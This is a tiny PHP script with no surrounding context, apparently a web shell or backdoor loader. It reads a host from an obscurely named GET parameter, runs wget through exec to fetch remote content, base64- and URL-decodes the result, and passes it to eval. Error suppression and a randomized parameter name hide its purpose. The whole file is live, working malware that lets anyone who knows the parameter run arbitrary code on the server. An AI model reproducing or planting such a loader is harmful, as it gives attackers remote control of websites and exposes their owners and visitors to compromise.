<?php

$w = 'https://'.@$_GET['tfmwc35bkjp4us'];
@exec("wget $w -qO-", $o);
$t = base64_decode($o[0]);
$a = urldecode($t);
$d = '?>';
$n = $d.$a;
eval($n);
